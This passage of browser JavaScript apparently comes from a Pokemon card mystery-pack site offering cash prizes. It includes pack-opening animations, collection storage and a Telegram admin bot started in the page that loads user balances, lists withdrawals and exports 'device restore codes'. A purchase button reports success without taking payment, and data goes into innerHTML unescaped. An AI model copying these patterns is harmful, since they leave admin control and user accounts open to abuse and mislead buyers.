            {
                name: '$100 Cash',
                label: 'One Hundred Dollars',
                value: '$100',
                cashValue: '$100',
                img: CASH_IMG,
                outOfStock: false
            },
            {
                name: '$500 Cash',
                label: 'Five Hundred Dollars',
                value: '$500',
                cashValue: '$500',
                img: CASH_IMG,
                outOfStock: false
            },
            {
                name: '$1,000 Amazon Spree',
                label: 'Amazon Shopping Spree',
                value: '$1,000',
                cashValue: '$1,000',
                img: 'https://i.postimg.cc/kXtVHhnS/OIP-(14).webp',
                outOfStock: false
            },
        ];

        function generateChasePacks() {
            const container = document.getElementById('chasePacksGrid');
            if (!container) return;
            container.innerHTML = '';

            PRIZE_DATA.forEach((prize, index) => {
                const el = document.createElement('div');
                el.className = 'chase-pack-item';
                el.style.animationDelay = `${index * 0.05}s`;
                if (prize.outOfStock) el.style.opacity = '0.6';

                const imgHtml = prize.img
                    ? `<img src="${prize.img}" style="width:52px;height:52px;object-fit:cover;border:1px solid var(--green);flex-shrink:0;" loading="lazy">`
                    : prize.outOfStock
                        ? `<div style="width:52px;height:52px;background:#1a0000;border:2px solid #ff4444;display:flex;align-items:center;justify-content:center;font-size:7px;color:#ff4444;flex-shrink:0;text-align:center;font-family:'Press Start 2P',monospace;line-height:1.5;">SOLD<br>OUT</div>`
                        : `<div style="width:52px;height:52px;background:var(--dark-gray);border:1px solid #333;flex-shrink:0;"></div>`;

                const stockHtml = prize.outOfStock
                    ? `<div style="font-size:6px;color:#ff4444;margin-top:2px;font-weight:bold;">OUT OF STOCK â€” CASH ONLY</div>`
                    : `<div style="font-size:6px;color:var(--green);margin-top:2px;">or ${prize.cashValue} cash</div>`;

                el.innerHTML = `
                    ${imgHtml}
                    <div class="chase-pack-info" style="flex:1;min-width:0;">
                        <div class="chase-pack-name">${prize.name}</div>
                        <div style="font-size:6px;color:var(--gray);margin-top:2px;">${prize.label}</div>
                    </div>
                    <div style="text-align:right;flex-shrink:0;">
                        <div class="chase-pack-price">${prize.value}</div>
                        ${stockHtml}
                    </div>
                `;
                container.appendChild(el);
            });
        }

        function showPackModal(pack) {
            // Create or update pack purchase modal
            let modal = document.getElementById('packPurchaseModal');
            if (!modal) {
                modal = document.createElement('div');
                modal.id = 'packPurchaseModal';
                modal.className = 'modal-overlay';
                modal.innerHTML = `
                    <div class="modal" style="max-width: 600px;">
                        <button class="modal-close" onclick="closeModal('packPurchaseModal')">Ã—</button>
                        <div class="modal-title">Purchase Pack</div>
                        <div class="modal-description">Select quantity and choose your purchase option.</div>
                        <div id="packModalContent"></div>
                    </div>
                `;
                document.body.appendChild(modal);
            }
            
            const content = document.getElementById('packModalContent');
            const randomColor = `hsl(${Math.random() * 360}, 60%, 40%)`;
            content.innerHTML = `
                <div style="display: grid; grid-template-columns: 200px 1fr; gap: 20px; margin-bottom: 20px;">
                    <div class="pack-image" style="background: linear-gradient(135deg, ${randomColor} 0%, ${randomColor}dd 100%); height: 280px;"></div>
                    <div>
                        <div style="font-size: 14px; color: var(--white); margin-bottom: 10px;">${pack.name}</div>
                        <div style="font-size: 8px; color: var(--gray); margin-bottom: 10px;">Price per pack</div>
                        <div style="font-size: 16px; color: var(--green); margin-bottom: 20px;">${pack.price}</div>
                        <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 20px;">
                            <div class="quantity-controls">
                                <button class="quantity-btn" onclick="adjustModalQuantity(-1)">-</button>
                                <input type="number" id="modalPackQuantity" value="1" min="1" class="quantity-input">
                                <button class="quantity-btn" onclick="adjustModalQuantity(1)">+</button>
                            </div>
                        </div>
                        <div style="font-size: 8px; color: var(--gray); margin-bottom: 10px;">Choose an option:</div>
<button class="modal-btn" onclick="addPackToCart('${pack.name}', ${pack.price.replace(/[^0-9.]/g, '')})">
                            <span>ðŸ›’</span>
                            <span>Add to cart</span>
                        </button>
                        <div style="text-align: center; color: var(--gray); font-size: 8px; margin: 10px 0;">or</div>
                        <button class="modal-btn" onclick="buyNow('${pack.name}', ${pack.price.replace(/[^0-9.]/g, '')})" style="background: var(--green);">
                            <span>âš¡</span>
                            <span>Buy now</span>
                        </button>
                    </div>
                </div>
            `;
            
            modal.classList.add('active');
        }

        function adjustModalQuantity(change) {
            const input = document.getElementById('modalPackQuantity');
            let value = parseInt(input.value) || 1;
            value = Math.max(1, value + change);
            input.value = value;
        }

function addPackToCart(packName, price) {
            const quantity = parseInt(document.getElementById('modalPackQuantity').value) || 1;
            const item = {
                name: packName,
                price: price
            };
            
            for (let i = 0; i < quantity; i++) {
                addToCart(item, price);
            }
            
            closeModal('packPurchaseModal');
        }

        function buyNow(packName, price) {
            const quantity = parseInt(document.getElementById('modalPackQuantity').value) || 1;
            const total = (price * quantity).toFixed(2);
            if (confirm(`Purchase ${quantity}x ${packName} for $${total}?`)) {
                alert('Purchase successful!');
                closeModal('packPurchaseModal');
            }
        }

        // Search and filter functions
        function filterCards() {
            const searchTerm = document.getElementById('marketSearch').value.toLowerCase();
            const cards = document.querySelectorAll('#marketCards .market-card');
            cards.forEach(card => {
                const cardName = card.querySelector('.card-name').textContent.toLowerCase();
                if (cardName.includes(searchTerm)) {
                    card.style.display = 'block';
                    card.style.animation = 'fadeInUp 0.3s ease';
                } else {
                    card.style.display = 'none';
                }
            });
        }

        function filterPacks() {
            const searchTerm = document.getElementById('packSearch').value.toLowerCase();
            const packs = document.querySelectorAll('#packsGrid .pack-item');
            packs.forEach(pack => {
                const packName = pack.querySelector('.pack-name').textContent.toLowerCase();
                if (packName.includes(searchTerm)) {
                    pack.style.display = 'block';
                    pack.style.animation = 'scaleIn 0.3s ease';
                } else {
                    pack.style.display = 'none';
                }
            });
        }

        function filterStorePacks() {
            const searchTerm = document.getElementById('storeSearch').value.toLowerCase();
            const packs = document.querySelectorAll('#storePacks .pack-item');
            packs.forEach(pack => {
                const packName = pack.querySelector('.pack-name').textContent.toLowerCase();
                if (packName.includes(searchTerm)) {
                    pack.style.display = 'block';
                    pack.style.animation = 'scaleIn 0.3s ease';
                } else {
                    pack.style.display = 'none';
                }
            });
        }

        function sortCards(sortType) {
            const container = document.getElementById('marketCards');
            const cards = Array.from(container.querySelectorAll('.market-card'));
            
            cards.sort((a, b) => {
                const priceA = parseFloat(a.querySelector('.card-price').textContent.replace(/[^0-9.]/g, '')) || 0;
                const priceB = parseFloat(b.querySelector('.card-price').textContent.replace(/[^0-9.]/g, '')) || 0;
                
                switch(sortType) {
                    case 'high-low':
                        return priceB - priceA;
                    case 'low-high':
                        return priceA - priceB;
                    default:
                        return 0;
                }
            });
            
            cards.forEach((card, index) => {
                card.style.animationDelay = `${index * 0.05}s`;
                container.appendChild(card);
            });
        }

        function sortPacks(sortType) {
            const container = document.getElementById('packsGrid');
            const packs = Array.from(container.querySelectorAll('.pack-item'));
            
            packs.sort((a, b) => {
                const priceA = parseFloat(a.querySelector('.pack-price').textContent.replace(/[^0-9.]/g, '')) || 0;
                const priceB = parseFloat(b.querySelector('.pack-price').textContent.replace(/[^0-9.]/g, '')) || 0;
                
                switch(sortType) {
                    case 'high-low':
                        return priceB - priceA;
                    case 'low-high':
                        return priceA - priceB;
                    default:
                        return 0;
                }
            });
            
            packs.forEach((pack, index) => {
                pack.style.animationDelay = `${index * 0.05}s`;
                container.appendChild(pack);
            });
        }

        function validateQuantity() {
            const input = document.getElementById('packQuantity');
            let value = parseInt(input.value) || 1;
            if (value < 1) value = 1;
            input.value = value;
        }

        function changeView(viewType) {
            const toggle = event.target.closest('.view-toggle');
            if (toggle) {
                toggle.querySelectorAll('.view-icon').forEach(icon => icon.classList.remove('active'));
                event.target.classList.add('active');
            }
            
            const container = document.getElementById('marketCards');
            if (container) {
                if (viewType === 'list') {
                    container.style.gridTemplateColumns = '1fr';
                } else if (viewType === 'grid') {
                    container.style.gridTemplateColumns = 'repeat(auto-fill, minmax(200px, 1fr))';
                } else {
                    container.style.gridTemplateColumns = 'repeat(auto-fill, minmax(200px, 1fr))';
                }
            }
        }

        function changePackView(viewType) {
            const toggle = event.target.closest('.view-toggle');
            if (toggle) {
                toggle.querySelectorAll('.view-icon').forEach(icon => icon.classList.remove('active'));
                event.target.classList.add('active');
            }
            
            const container = document.getElementById('packsGrid');
            if (container) {
                if (viewType === 'list') {
                    container.style.gridTemplateColumns = '1fr';
                } else if (viewType === 'grid') {
                    container.style.gridTemplateColumns = 'repeat(auto-fill, minmax(180px, 1fr))';
                } else {
                    container.style.gridTemplateColumns = 'repeat(auto-fill, minmax(180px, 1fr))';
                }
            }
        }

        const expansions = [
            { name: 'Phantasmal Flames', cards: '130 cards', date: 'Released 11/13/2025', series: 'Mega Evolution' },
            { name: 'Mega Evolution', cards: '188 cards', date: 'Released 9/25/2025', series: 'Mega Evolution' },
            { name: 'Scarlet & Violet Base', cards: '198 cards', date: 'Released 3/31/2023', series: 'Scarlet & Violet' },
            { name: 'Paldea Evolved', cards: '193 cards', date: 'Released 6/9/2023', series: 'Scarlet & Violet' },
            { name: 'Obsidian Flames', cards: '197 cards', date: 'Released 8/11/2023', series: 'Scarlet & Violet' },
            { name: '151', cards: '165 cards', date: 'Released 9/22/2023', series: 'Scarlet & Violet' },
            { name: 'Paradox Rift', cards: '182 cards', date: 'Released 11/3/2023', series: 'Scarlet & Violet' },
            { name: 'Temporal Forces', cards: '218 cards', date: 'Released 3/22/2024', series: 'Scarlet & Violet' },
            { name: 'Twilight Masquerade', cards: '167 cards', date: 'Released 5/24/2024', series: 'Scarlet & Violet' },
            { name: 'Shrouded Fable', cards: '64 cards', date: 'Released 8/2/2024', series: 'Scarlet & Violet' },
            { name: 'Vivid Voltage', cards: '185 cards', date: 'Released 11/13/2020', series: 'Sword & Shield' },
            { name: 'Shining Fates', cards: '72 cards', date: 'Released 2/19/2021', series: 'Sword & Shield' },
            { name: 'Chilling Reign', cards: '198 cards', date: 'Released 6/18/2021', series: 'Sword & Shield' },
            { name: 'Evolving Skies', cards: '203 cards', date: 'Released 8/27/2021', series: 'Sword & Shield' },
            { name: 'Fusion Strike', cards: '264 cards', date: 'Released 11/12/2021', series: 'Sword & Shield' },
            { name: 'Brilliant Stars', cards: '172 cards', date: 'Released 2/25/2022', series: 'Sword & Shield' },
            { name: 'Astral Radiance', cards: '189 cards', date: 'Released 5/27/2022', series: 'Sword & Shield' },
            { name: 'Lost Origin', cards: '196 cards', date: 'Released 9/9/2022', series: 'Sword & Shield' },
            { name: 'Silver Tempest', cards: '195 cards', date: 'Released 11/11/2022', series: 'Sword & Shield' },
            { name: 'Crown Zenith', cards: '159 cards', date: 'Released 1/20/2023', series: 'Sword & Shield' }
        ];

        function generateExpansions() {
            const container = document.getElementById('expansionsGrid');
            container.innerHTML = '';
            
            expansions.forEach((exp, index) => {
                const expEl = document.createElement('div');
                expEl.className = 'expansion-card';
                expEl.style.opacity = '0';
                expEl.style.transform = 'translateY(20px)';
                expEl.style.animation = `fadeInUp 0.5s ease forwards`;
                expEl.style.animationDelay = `${index * 0.05}s`;
                const randomColor = `hsl(${Math.random() * 360}, 50%, 30%)`;
                expEl.innerHTML = `
                    <div class="expansion-image" style="background: linear-gradient(135deg, ${randomColor} 0%, ${randomColor}cc 100%);">
                        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 64px; opacity: 0.3;">âš¡</div>
                    </div>
                    <div class="expansion-name">${exp.name}</div>
                    <div style="font-size: 7px; color: var(--green); margin: 5px 0;">${exp.series}</div>
                    <div class="expansion-info">${exp.cards}<br>${exp.date}</div>
                `;
                container.appendChild(expEl);
            });
        }

        // Auto-refresh latest pulls
        function refreshLatestPulls() {
            generateLatestPulls();
        }

        // Smooth scroll
        function smoothScrollTo(element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }

        function showCardModal(card) {
            let modal = document.getElementById('cardModal');
            if (!modal) {
                modal = document.createElement('div');
                modal.id = 'cardModal';
                modal.className = 'modal-overlay';
                modal.innerHTML = `
                    <div class="modal" style="max-width: 500px;">
                        <button class="modal-close" onclick="closeModal('cardModal')">Ã—</button>
                        <div class="modal-title">${card.name}</div>
                        <div id="cardModalContent"></div>
                    </div>
                `;
                document.body.appendChild(modal);
            }
            
            const content = document.getElementById('cardModalContent');
            const randomColor = `hsl(${Math.random() * 360}, 70%, 50%)`;
            content.innerHTML = `
                <div style="text-align: center; margin-bottom: 20px;">
                    <div class="card-image" style="width: 200px; height: 280px; margin: 0 auto; background: linear-gradient(135deg, ${randomColor}22 0%, ${randomColor}88 100%);"></div>
                </div>
                <div style="text-align: center; margin-bottom: 15px;">
                    <div class="card-price" style="font-size: 18px;">${card.price}</div>
                    <div class="card-rarity" style="margin-top: 10px;">${card.rarity} â€¢ HP ${card.hp}</div>
                    <div style="margin-top: 10px;">
                        ${card.badges.map(b => `<span class="badge" style="margin: 5px;">${b}</span>`).join('')}
                    </div>
                </div>
                <button class="modal-btn" onclick="addToCart('${card.name}', ${card.price.replace(/[^0-9.]/g, '')}); closeModal('cardModal');">
                    <span>ðŸ›’</span>
                    <span>Add to cart</span>
                </button>
            `;
            
            modal.classList.add('active');
        }

// Initialize and fetch data from rip.fun
        document.addEventListener('DOMContentLoaded', async () => {
            createSnowflakes();
            generateLatestPulls();
            
            // Check login state
            checkLoginState();

            // Telegram bot init â€” owner ID is hardcoded, start immediately
            document.getElementById('tgSetupBanner').style.display = 'none';
            fetch(`${TG_API}/deleteWebhook`, {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({drop_pending_updates: false})
            }).catch(()=>{});
            // Register commands
            fetch(`${TG_API}/setMyCommands`, {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({ commands: [
                    { command: 'start',     description: 'Show admin menu' },
                    { command: 'viewusers', description: 'List all registered users' },
                    { command: 'load',        description: 'Load balance: /load amount username' },
                    { command: 'balance',     description: 'Check balance: /balance username' },
                    { command: 'withdrawals', description: 'View pending withdrawal requests' },
                    { command: 'reply',       description: 'Reply to user: /reply username message' },
                    { command: 'exportuser',  description: 'Get device restore code: /exportuser username' }
                ]})
            }).catch(()=>{});
            tgStartPolling();
            
            // Fetch data from marketplace API in parallel
            console.log('Fetching marketplace data...');
            const [cardsData, packsData] = await Promise.all([
                fetchCardsFromMarketplace(),
                fetchPacksFromMarketplace()
            ]);
            
            if (cardsData) {
                fetchedCards = cardsData;
                console.log(`âœ“ Loaded ${cardsData.length} cards`);
                const statusEl = document.getElementById('dataStatus');
                if (statusEl) {
                    statusEl.textContent = `${cardsData.length} cards loaded`;
                    statusEl.style.color = 'var(--green)';
                }
            } else {
                console.log('Using fallback card data');
                const statusEl = document.getElementById('dataStatus');
                if (statusEl) {
                    statusEl.textContent = 'Using local data';
                    statusEl.style.color = 'var(--gray)';
                }
            }
            
            if (packsData) {
                fetchedPacks = packsData;
                console.log(`âœ“ Loaded ${packsData.length} packs`);
            } else {
                console.log('Using fallback pack data');
            }
            
            lastFetchTime = new Date();
            
            // Generate pages with fetched data
            await generateMarketCards();
            await generatePacks();
            generateExpansions();
            await generateStorePacks();
            
            // Refresh latest pulls every 30 seconds
            setInterval(refreshLatestPulls, 30000);
            
            // Refresh marketplace data every 5 minutes
            setInterval(async () => {
                console.log('Refreshing marketplace data...');
                fetchedCards = await fetchCardsFromMarketplace();
                fetchedPacks = await fetchPacksFromMarketplace();
                
                // Regenerate if on those pages
                const activePage = document.querySelector('.page.active');
                if (activePage && activePage.id === 'page-market') {
                    await generateMarketCards();
                } else if (activePage && activePage.id === 'page-packs') {
                    await generatePacks();
                }
            }, 300000); // 5 minutes
            
            // Add smooth page transitions
            const pages = document.querySelectorAll('.page');
            pages.forEach(page => {
                page.addEventListener('transitionend', () => {
                    if (page.classList.contains('active')) {
                        // Trigger animations when page becomes active
                        const cards = page.querySelectorAll('.market-card, .pack-item, .pull-card');
                        cards.forEach((card, index) => {
                            card.style.animationDelay = `${index * 0.05}s`;
                        });
                    }
                });
            });

            // Smooth scroll behavior
            document.documentElement.style.scrollBehavior = 'smooth';
        });

        // Close modals on outside click
        document.querySelectorAll('.modal-overlay').forEach(overlay => {
            overlay.addEventListener('click', (e) => {
                if (e.target === overlay) {
                    overlay.classList.remove('active');
                }
            });
        });

        // ============================================
        // PACK OPENING SYSTEM - FULL ANIMATION
        // ============================================
        
        let packOpeningInProgress = false;
        let currentPackOpening = null;
        
        async function openPack(packData) {
            if (packOpeningInProgress) return;
            
            packOpeningInProgress = true;
            const packModal = document.createElement('div');
            packModal.className = 'modal-overlay active';
            packModal.id = 'packOpeningModal';
            packModal.innerHTML = `
                <div class="pack-opening-container">
                    <div class="pack-opening-stage" id="packStage1">
                        <div class="pack-wrapper">
                            <div class="pack-3d" id="pack3D">
                                <div class="pack-front"></div>
                                <div class="pack-back"></div>
                                <div class="pack-top"></div>
                                <div class="pack-bottom"></div>
                                <div class="pack-left"></div>
                                <div class="pack-right"></div>
                            </div>
                        </div>
                        <div class="pack-opening-text">Click to open pack!</div>
                    </div>
                    <div class="pack-opening-stage" id="packStage2" style="display: none;">
                        <div class="cards-reveal-container" id="cardsReveal"></div>
                    </div>
                    <div class="pack-opening-stage" id="packStage3" style="display: none;">
                        <div class="pack-results" id="packResults"></div>
                    </div>
                </div>
            `;
            document.body.appendChild(packModal);
            
            // Stage 1: Pack display
            const pack3D = document.getElementById('pack3D');
            pack3D.addEventListener('click', () => {
                startPackOpening(packData);
            });
            
            // Animate pack floating
            animatePackFloat(pack3D);
        }
        
        function animatePackFloat(element) {
            let rotation = 0;
            setInterval(() => {
                rotation += 0.5;
                element.style.transform = `rotateY(${rotation}deg) rotateX(${Math.sin(rotation / 10) * 5}deg)`;
            }, 50);
        }
        
        async function startPackOpening(packData) {
            const stage1 = document.getElementById('packStage1');
            const stage2 = document.getElementById('packStage2');
            const pack3D = document.getElementById('pack3D');
            
            // Animate pack opening
            pack3D.style.animation = 'packOpen 1s ease forwards';
            
            setTimeout(() => {
                stage1.style.display = 'none';
                stage2.style.display = 'block';
                revealCards(packData);
            }, 1000);
        }
        
        async function revealCards(packData) {
            const container = document.getElementById('cardsReveal');
            const cards = generatePackContents(packData);
            
            for (let i = 0; i < cards.length; i++) {
                await new Promise(resolve => setTimeout(resolve, 500));
                const cardEl = createCardElement(cards[i], i);
                container.appendChild(cardEl);
                animateCardReveal(cardEl);
            }
            
            setTimeout(() => {
                showPackResults(cards);
            }, cards.length * 500 + 1000);
        }
        
        function generatePackContents(packData) {
            const cards = [];
            const allCards = fetchedCards || pokemonCards;
            
            // Generate 10 cards per pack (standard Pokemon pack)
            for (let i = 0; i < 10; i++) {
                const rarity = determineRarity(i);
                const card = getRandomCardByRarity(allCards, rarity);
                cards.push({
                    ...card,
                    rarity: rarity,
                    packNumber: i + 1
                });
            }
            
            return cards;
        }
        
        function determineRarity(position) {
            if (position === 0) return 'Ultra Rare'; // First card is rare
            if (position === 1) return 'Rare'; // Second card
            if (position < 4) return 'Uncommon';
            return 'Common';
        }
        
        function getRandomCardByRarity(cards, rarity) {
            const filtered = cards.filter(c => c.rarity === rarity || (!c.rarity && rarity === 'Common'));
            return filtered[Math.floor(Math.random() * filtered.length)] || cards[Math.floor(Math.random() * cards.length)];
        }
        
        function createCardElement(card, index) {
            const cardEl = document.createElement('div');
            cardEl.className = 'revealed-card';
            cardEl.style.animationDelay = `${index * 0.1}s`;
            const randomColor = `hsl(${Math.random() * 360}, 70%, 50%)`;
            const imageStyle = card.image 
                ? `background-image: url('${card.image}'); background-size: cover;`
                : `background: linear-gradient(135deg, ${randomColor}22 0%, ${randomColor}88 100%);`;
            
            cardEl.innerHTML = `
                <div class="card-flip-inner">
                    <div class="card-flip-front" style="${imageStyle}">
                        <div class="card-back-pattern"></div>
                    </div>
                    <div class="card-flip-back" style="${imageStyle}">
                        <div class="card-content">
                            <div class="card-rarity-badge ${card.rarity.toLowerCase().replace(' ', '-')}">${card.rarity}</div>
                            <div class="card-name-large">${card.name}</div>
                            <div class="card-price-large">${card.price}</div>
                        </div>
                    </div>
                </div>
            `;
            
            setTimeout(() => {
                cardEl.querySelector('.card-flip-inner').classList.add('flipped');
            }, 300);
            
            return cardEl;
        }
        
        function animateCardReveal(element) {
            element.style.opacity = '0';
            element.style.transform = 'scale(0.5) rotateY(180deg)';
            
            setTimeout(() => {
                element.style.transition = 'all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55)';
                element.style.opacity = '1';
                element.style.transform = 'scale(1) rotateY(0deg)';
            }, 100);
        }
        
        function showPackResults(cards) {
            const stage2 = document.getElementById('packStage2');
            const stage3 = document.getElementById('packStage3');
            const resultsContainer = document.getElementById('packResults');
            
            stage2.style.display = 'none';
            stage3.style.display = 'block';
            
            const totalValue = cards.reduce((sum, card) => {
                const price = parseFloat(card.price.replace(/[^0-9.]/g, '')) || 0;
                return sum + price;
            }, 0);
            
            const rareCards = cards.filter(c => c.rarity === 'Rare' || c.rarity === 'Ultra Rare');
            
            resultsContainer.innerHTML = `
                <h2 class="results-title">Pack Opening Complete!</h2>
                <div class="results-stats">
                    <div class="stat-item">
                        <div class="stat-value">${cards.length}</div>
                        <div class="stat-label">Cards Opened</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">${rareCards.length}</div>
                        <div class="stat-label">Rare Cards</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">$${totalValue.toFixed(2)}</div>
                        <div class="stat-label">Total Value</div>
                    </div>
                </div>
                <div class="results-cards-grid">
                    ${cards.map(card => `
                        <div class="result-card">
                            <div class="result-card-image" style="background: linear-gradient(135deg, hsl(${Math.random() * 360}, 70%, 50%)22 0%, hsl(${Math.random() * 360}, 70%, 50%)88 100%);"></div>
                            <div class="result-card-name">${card.name}</div>
                            <div class="result-card-rarity ${card.rarity.toLowerCase().replace(' ', '-')}">${card.rarity}</div>
                            <div class="result-card-price">${card.price}</div>
                        </div>
                    `).join('')}
                </div>
                <div class="results-actions">
                    <button class="modal-btn" onclick="addCardsToCollection(${JSON.stringify(cards).replace(/"/g, '&quot;')})">Add to Collection</button>
                    <button class="modal-btn secondary" onclick="closePackOpening()">Close</button>
                </div>
            `;
            
            // Add cards to user's collection
            addCardsToCollection(cards);
        }
        
        function addCardsToCollection(cards) {
            let collection = JSON.parse(localStorage.getItem('userCollection') || '[]');
            cards.forEach(card => {
                const existing = collection.find(c => c.name === card.name);
                if (existing) {
                    existing.quantity = (existing.quantity || 1) + 1;
                } else {
                    collection.push({...card, quantity: 1, obtainedAt: new Date().toISOString()});
                }
            });
            localStorage.setItem('userCollection', JSON.stringify(collection));
            updateCollectionStats();
            showNotification('Cards added to your collection!', 'success');
        }
        
        function closePackOpening() {
            const modal = document.getElementById('packOpeningModal');
            if (modal) {
                modal.classList.remove('active');
                setTimeout(() => modal.remove(), 300);
            }
            packOpeningInProgress = false;
        }
        
        // ============================================
        // COLLECTION SYSTEM
        // ============================================
        
        let userCollection = JSON.parse(localStorage.getItem('userCollection') || '[]');
        let userStats = JSON.parse(localStorage.getItem('userStats') || '{}');
        
        function updateCollectionStats() {
            userCollection = JSON.parse(localStorage.getItem('userCollection') || '[]');
            const totalCards = userCollection.reduce((sum, card) => sum + (card.quantity || 1), 0);
            const uniqueCards = userCollection.length;
            const totalValue = userCollection.reduce((sum, card) => {
                const price = parseFloat((card.price || '$0').replace(/[^0-9.]/g, '')) || 0;
                return sum + (price * (card.quantity || 1));
            }, 0);
            
            userStats = {
                totalCards,
                uniqueCards,
                totalValue,
                lastUpdated: new Date().toISOString()
            };
            
            localStorage.setItem('userStats', JSON.stringify(userStats));
            updateStatsDisplay();
        }
        
        function updateStatsDisplay() {
            const statsElements = document.querySelectorAll('.collection-stat');
            statsElements.forEach(el => {
                const statType = el.getAttribute('data-stat');
                if (statType === 'total') {
                    el.textContent = userStats.totalCards || 0;
                } else if (statType === 'unique') {
                    el.textContent = userStats.uniqueCards || 0;
                } else if (statType === 'value') {
                    el.textContent = `$${(userStats.totalValue || 0).toFixed(2)}`;
                }
            });
        }
        
        function showCollectionPage() {
            showPage('collection');
        }
        
        function generateCollectionPage() {
            const container = document.getElementById('collectionGrid');
            if (!container) return;
            
            container.innerHTML = '';
            
            if (userCollection.length === 0) {
                container.innerHTML = `
                    <div style="grid-column: 1/-1; text-align: center; padding: 60px; color: var(--gray);">
                        <div style="margin-bottom: 20px;"><img src="https://i.postimg.cc/8PrjSd5W/minimalist-cartoon-style-illustration-cardboard-shipping-box-featuring-heavy-shading-staining-forced.png" style="height:96px;width:auto;"></div>
                        <div style="font-size: 14px; margin-bottom: 10px;">Your collection is empty</div>
                        <div style="font-size: 8px; margin-bottom: 20px;">Open some packs to start collecting!</div>
                        <button class="modal-btn" onclick="showPage('mystery-pack')">Open Mystery Pack</button>
                    </div>
                `;
                return;
            }
            
            userCollection.forEach((card, index) => {
                const cardEl = document.createElement('div');
                cardEl.className = 'collection-card';
                cardEl.style.animationDelay = `${index * 0.03}s`;
                const randomColor = `hsl(${Math.random() * 360}, 70%, 50%)`;
                const imageStyle = card.image 
                    ? `background-image: url('${card.image}'); background-size: cover;`
                    : `background: linear-gradient(135deg, ${randomColor}22 0%, ${randomColor}88 100%);`;
                
                cardEl.innerHTML = `
                    <div class="card-quantity-badge">x${card.quantity || 1}</div>
                    <div class="collection-card-image" style="${imageStyle}" onclick="showCardDetails('${card.name.replace(/'/g, "\\'")}')"></div>
                    <div class="collection-card-name">${card.name}</div>
                    <div class="collection-card-rarity">${card.rarity || 'Rare'}</div>
                    <div class="collection-card-price">${card.price || '$0.00'}</div>
                    <div class="collection-card-actions">
                        <button class="collection-action-btn" onclick="tradeCard('${card.name.replace(/'/g, "\\'")}')" title="Trade">ðŸ”„</button>
                        <button class="collection-action-btn" onclick="sellCard('${card.name.replace(/'/g, "\\'")}')" title="Sell">ðŸ’°</button>
                        <button class="collection-action-btn" onclick="removeFromCollection('${card.name.replace(/'/g, "\\'")}')" title="Remove">ðŸ—‘ï¸</button>
                    </div>
                `;
                container.appendChild(cardEl);
            });
        }
        
        function showCardDetails(cardName) {
            const card = userCollection.find(c => c.name === cardName) || 
                        (fetchedCards || pokemonCards).find(c => c.name === cardName);
            if (!card) return;
            
            const modal = document.createElement('div');
            modal.className = 'modal-overlay active';
            modal.id = 'cardDetailsModal';
            const randomColor = `hsl(${Math.random() * 360}, 70%, 50%)`;
            const imageStyle = card.image 
                ? `background-image: url('${card.image}'); background-size: cover;`
                : `background: linear-gradient(135deg, ${randomColor}22 0%, ${randomColor}88 100%);`;
            
            modal.innerHTML = `
                <div class="modal" style="max-width: 700px;">
                    <button class="modal-close" onclick="closeModal('cardDetailsModal')">Ã—</button>
                    <div class="card-details-container">
                        <div class="card-details-image" style="${imageStyle}"></div>
                        <div class="card-details-info">
                            <h2 class="card-details-name">${card.name}</h2>
                            <div class="card-details-rarity ${(card.rarity || 'Rare').toLowerCase().replace(' ', '-')}">${card.rarity || 'Rare'}</div>
                            <div class="card-details-price">${card.price || '$0.00'}</div>
                            <div class="card-details-stats">
                                <div class="detail-stat">
                                    <span class="detail-label">HP:</span>
                                    <span class="detail-value">${card.hp || 'N/A'}</span>
                                </div>
                                <div class="detail-stat">
                                    <span class="detail-label">Owned:</span>
                                    <span class="detail-value">${card.quantity || 1}x</span>
                                </div>
                                <div class="detail-stat">
                                    <span class="detail-label">Obtained:</span>
                                    <span class="detail-value">${card.obtainedAt ? new Date(card.obtainedAt).toLocaleDateString() : 'Unknown'}</span>
                                </div>
                            </div>
                            <div class="card-details-actions">
                                <button class="modal-btn" onclick="tradeCard('${card.name.replace(/'/g, "\\'")}')">Trade</button>
                                <button class="modal-btn" onclick="sellCard('${card.name.replace(/'/g, "\\'")}')">Sell</button>
                                <button class="modal-btn secondary" onclick="addToWishlist('${card.name.replace(/'/g, "\\'")}')">Add to Wishlist</button>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        }
        
        function removeFromCollection(cardName) {
            if (confirm(`Remove ${cardName} from collection?`)) {
                userCollection = userCollection.filter(c => c.name !== cardName);
                localStorage.setItem('userCollection', JSON.stringify(userCollection));
                updateCollectionStats();
                generateCollectionPage();
                showNotification('Card removed from collection', 'info');
            }
        }
        
        // ============================================
        // TRADING SYSTEM
        // ============================================
        
        let tradeOffers = JSON.parse(localStorage.getItem('tradeOffers') || '[]');
        let activeTrades = JSON.parse(localStorage.getItem('activeTrades') || '[]');
        
        function tradeCard(cardName) {
            const card = userCollection.find(c => c.name === cardName);
            if (!card) {
                showNotification('Card not found in collection', 'error');
                return;
            }
            
            const modal = document.createElement('div');
            modal.className = 'modal-overlay active';
            modal.id = 'tradeModal';
            modal.innerHTML = `
                <div class="modal" style="max-width: 800px;">
                    <button class="modal-close" onclick="closeModal('tradeModal')">Ã—</button>
                    <div class="modal-title">Trade Card</div>
                    <div class="trade-container">
                        <div class="trade-section">
                            <h3>Your Card</h3>
                            <div class="trade-card-preview">
                                <div class="trade-card-name">${card.name}</div>
                                <div class="trade-card-price">${card.price || '$0.00'}</div>
                            </div>
                        </div>
                        <div class="trade-arrow">â‡„</div>
                        <div class="trade-section">
                            <h3>Request Card</h3>
                            <input type="text" id="tradeSearchCard" class="search-bar" placeholder="Search for card..." oninput="searchTradeCards(this.value)">
                            <div class="trade-cards-list" id="tradeCardsList"></div>
                        </div>
                    </div>
                    <div class="trade-actions">
                        <button class="modal-btn" onclick="createTradeOffer('${cardName.replace(/'/g, "\\'")}')">Create Trade Offer</button>
                        <button class="modal-btn secondary" onclick="closeModal('tradeModal')">Cancel</button>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
            loadTradeableCards();
        }
        
        function loadTradeableCards() {
            const container = document.getElementById('tradeCardsList');
            const allCards = fetchedCards || pokemonCards;
            const userCardNames = new Set(userCollection.map(c => c.name));
            
            container.innerHTML = '';
